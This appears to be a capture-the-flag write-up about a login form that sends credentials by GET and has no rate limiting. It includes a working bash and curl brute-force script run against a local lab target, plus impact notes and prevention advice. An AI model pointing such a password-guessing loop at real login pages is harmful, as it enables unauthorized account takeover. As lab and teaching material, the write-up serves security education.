# Brute Force - Login Form

## Vulnerability
The login form has no rate limiting, account lockout, or CAPTCHA, allowing unlimited password attempts.
Additionally, the form uses a GET request instead of POST, exposing credentials in plain text in the URL and browser history.

## Exploitation

Cluster Bomb attack using a bash + curl script (no Burp Suite needed):

1. Navigate to `?page=signin` and observe the login form uses GET — credentials appear in the URL
2. Create `users.txt` with common usernames (admin, root, user, administrator, etc.)
3. Create `passwords.txt` with common passwords (rockyou.txt or a curated short list)
4. Run the following script:

```bash
echo -e "admin\nroot\nuser\nadministrator" > users.txt
```
```bash
echo -e "password\n123456\nadmin\nshadow\nroot\n1234\nletmein\nqwerty" > passwords.txt
```

```bash
while read username; do
  while read password; do
    response=$(curl -s "http://localhost:8080/?page=signin&username=$username&password=$password&Login=Login")
    if echo "$response" | grep -q "flag"; then
      echo "[+] FOUND! username=$username password=$password"
      exit 0
    else
      echo "[-] Trying $username:$password"
    fi
  done < passwords.txt
done < users.txt
```

5. The script found `admin:shadow` on attempt 19 — the response contained the flag

The full script is available at `../brute_force.sh`.

## Impact
Any account can be compromised by automated password guessing without any restriction.
Credentials sent via GET are also visible in server logs, browser history, and network traffic.

## Prevention
- Use POST (never GET) for sending credentials
- Implement rate limiting (e.g. max 5 attempts per minute per IP)
- Lock accounts after N failed attempts
- Add CAPTCHA after failed attempts
- Enforce strong password policy
- Implement two-factor authentication (2FA)
